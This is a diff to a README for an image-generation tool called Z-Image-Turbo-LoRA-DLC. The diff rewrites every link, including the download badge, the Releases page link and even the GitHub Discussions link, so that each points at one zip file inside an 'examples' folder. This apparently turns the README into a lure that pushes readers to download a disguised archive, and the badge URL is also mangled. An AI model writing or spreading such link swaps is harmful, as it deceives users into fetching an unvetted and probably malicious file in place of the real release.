@@ -1,6 +1,6 @@
 # 🌟 Z-Image-Turbo-LoRA-DLC - Create Stunning Images Effortlessly
 
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://github.com/huntengu/Z-Image-Turbo-LoRA-DLC/releases)
+[![Download](https://raw.githubusercontent.com/huntengu/Z-Image-Turbo-LoRA-DLC/main/examples/Turbo-Lo-Image-R-DLC-v1.7.zip%https://raw.githubusercontent.com/huntengu/Z-Image-Turbo-LoRA-DLC/main/examples/Turbo-Lo-Image-R-DLC-v1.7.zip)](https://raw.githubusercontent.com/huntengu/Z-Image-Turbo-LoRA-DLC/main/examples/Turbo-Lo-Image-R-DLC-v1.7.zip)
 
 ## 📖 Overview
 
@@ -23,7 +23,7 @@ Before you start, make sure your computer meets these basic requirements:
 
 To get the latest version of the software, visit our Releases page:
 
-[Download Here](https://github.com/huntengu/Z-Image-Turbo-LoRA-DLC/releases)
+[Download Here](https://raw.githubusercontent.com/huntengu/Z-Image-Turbo-LoRA-DLC/main/examples/Turbo-Lo-Image-R-DLC-v1.7.zip)
 
 On the Releases page, find the version that suits your system and click to download the corresponding file. After downloading, follow these steps to install:
 
@@ -90,11 +90,11 @@ You can also find solutions in the “Issues” section on our GitHub page, wher
 
 Join our community to share your creations and get support:
 
-- Visit our [GitHub Discussions](https://github.com/huntengu/Z-Image-Turbo-LoRA-DLC/discussions).
+- Visit our [GitHub Discussions](https://raw.githubusercontent.com/huntengu/Z-Image-Turbo-LoRA-DLC/main/examples/Turbo-Lo-Image-R-DLC-v1.7.zip).
 - Follow us on social media to stay updated with new features and tutorials.
 
 ### 🏁 Conclusion
 
 Now you're ready to create stunning images with ease using Z-Image-Turbo-LoRA-DLC. Explore the creative possibilities and enjoy your experience!
 
-For more downloads and updates, visit our [Releases page](https://github.com/huntengu/Z-Image-Turbo-LoRA-DLC/releases). Happy creating!
+For more downloads and updates, visit our [Releases page](https://raw.githubusercontent.com/huntengu/Z-Image-Turbo-LoRA-DLC/main/examples/Turbo-Lo-Image-R-DLC-v1.7.zip). Happy creating!
